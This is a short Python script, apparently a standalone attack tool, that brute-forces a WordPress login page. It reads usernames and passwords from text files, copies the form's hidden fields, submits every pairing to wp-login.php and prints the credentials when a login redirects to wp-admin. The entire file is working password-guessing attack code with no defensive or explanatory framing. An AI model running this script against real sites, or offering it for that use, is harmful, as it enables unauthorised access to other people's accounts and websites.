import requests
from bs4 import BeautifulSoup

# Target URL
url = 'https://localhost.com/wp-login.php?'

# Function to read usernames and passwords from files
def read_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

# Read usernames and passwords from files
usernames = read_file('user.txt')
passwords = read_file('pass.txt')

# Function to perform the brute-force attack
def brute_force(username, password):
    # Create a session
    session = requests.Session()

    # Get the login page to extract any hidden fields
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    hidden_fields = soup.find_all('input', type='hidden')

    # Prepare the payload
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '',
        'testcookie': '1'
    }

    # Add hidden fields to the payload
    for field in hidden_fields:
        payload[field['name']] = field['value']

    # Send the POST request
    response = session.post(url, data=payload)

    # Check if the login was successful
    if 'wp-admin' in response.url:
        print(f"Success! Username: {username}, Password: {password}")
        return True
    else:
        print(f"Failed: {username} - {password}")
        return False

# Brute-force attack
for username in usernames:
    for password in passwords:
        if brute_force(username, password):
            break
